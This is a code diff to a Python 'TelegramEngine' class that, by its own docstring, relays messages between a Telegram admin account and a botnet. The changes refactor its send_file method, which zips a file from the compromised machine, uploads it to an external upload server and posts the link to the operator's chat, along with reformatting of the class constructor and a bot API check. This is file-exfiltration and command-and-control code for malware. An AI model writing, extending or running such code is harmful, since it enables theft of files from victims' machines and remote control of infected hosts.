@@ -17,15 +17,12 @@ class TelegramEngine(BaseEngine):
     transfer messages between `telegram account (admin)` and `botnet`
     """
 
-    def __init__(
-        self, token: str = None, admin_chat_id: str = None
-    ) -> None:
+    def __init__(self, token: str = None, admin_chat_id: str = None) -> None:
         self.token = token
         self.admin_chat_id = admin_chat_id
         self._use_proxy = False
         self._update_id = 0
         self._is_first_run = True
-
 
     def __str__(self):
         return f"<TOKEN:({self.token}), ADMIN_CHAT_ID:({self.admin_chat_id})>"
@@ -68,16 +65,24 @@ class TelegramEngine(BaseEngine):
 
     def send_file(self, file_route: str, additionalـinfo: dict = {}) -> bool:
         try:
-            file_name = upload_server.make_zip_file(file_route)
-            if file_name:
-                with open(file_name, "rb") as file:
-                    data = upload_server.upload_server_1(file=file.read(), file_name=file_name)
-                os.remove(file_name)
+            is_true, res = upload_server.make_zip_file(file_route)
+            if not is_true:
+                self.send(f"{res}", additionalـinfo=additionalـinfo)
+                _logger.debug(f"send_file.make_zip_file: {res}")
+                return False
+
+            else:
+                zip_file_name = res
+
+                with open(zip_file_name, "rb") as file:
+                    _, data = upload_server.upload_server_1(
+                        file=file.read(), file_name=zip_file_name
+                    )
+
+                os.remove(zip_file_name)
                 self.send(data, additionalـinfo=additionalـinfo)
                 return data
 
-            _logger.debug(f"send_file: file not found")
-            return False
         except Exception as e:
             _logger.debug(f"send_file: error {e}")
             return False
@@ -92,7 +97,9 @@ class TelegramEngine(BaseEngine):
 
     def _getme(self):
         try:
-            res = requests.get(f"https://api.telegram.org/bot{self.token}/getMe", timeout=.5)
+            res = requests.get(
+                f"https://api.telegram.org/bot{self.token}/getMe", timeout=0.5
+            )
             if res.status_code == 200:
                 return res.json()
             return False
